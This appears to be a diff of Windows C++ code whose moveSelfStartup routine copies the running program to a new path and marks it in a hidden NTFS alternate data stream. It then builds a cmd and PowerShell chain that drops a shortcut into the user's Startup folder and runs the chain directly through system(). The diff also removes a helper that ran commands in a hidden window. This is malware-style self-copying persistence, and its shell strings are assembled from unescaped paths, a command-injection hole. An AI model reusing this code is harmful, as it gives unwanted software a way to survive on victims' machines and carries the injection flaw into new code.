@@ -44,29 +44,6 @@ std::string getSelfName() {
 extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
 extern "C" bool __cdecl isStartup() { return (access_(getSelfName() + ":startup")); }
 
-bool exec(std::string command) {
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    TCHAR cmd[1024];
-    _tcscpy(cmd, TEXT(command.c_str()));
-
-    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        return false;
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    return true;
-}
-
 extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//FULL path_
     std::string self = getSelfName();
     std::string path = gsfcp(path_);
@@ -74,14 +51,10 @@ extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {/
     if (isStartup()) { return 1; }//The current file is already processed by this code.
     //std::string pTmp = "C:/Users/" + getUName() + "/AppData/Local/Temp/";
     std::string pStartup = "C:/Users/" + getUName() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
-    std::string psCmd = "powershell.exe -Command \"& { $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('./" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
+    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
     std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd;
 
-    //std::cout << oneToRuleThemAll << "\n";
-
-    std::ofstream file("installer.cmd");
-    file << oneToRuleThemAll;
-    file.close();
+    system(oneToRuleThemAll.c_str());
 
     return 0;
 }
